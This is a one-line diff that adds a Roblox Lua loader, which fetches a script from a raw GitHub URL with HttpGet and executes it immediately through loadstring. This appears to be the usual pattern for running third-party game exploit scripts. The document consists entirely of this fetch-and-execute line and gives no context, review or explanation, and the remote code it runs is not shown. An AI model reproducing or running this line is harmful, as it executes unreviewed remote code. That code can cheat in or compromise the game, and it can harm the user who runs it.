@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CongoOhioDog/Psalms.Tech/refs/heads/main/Main",true))()
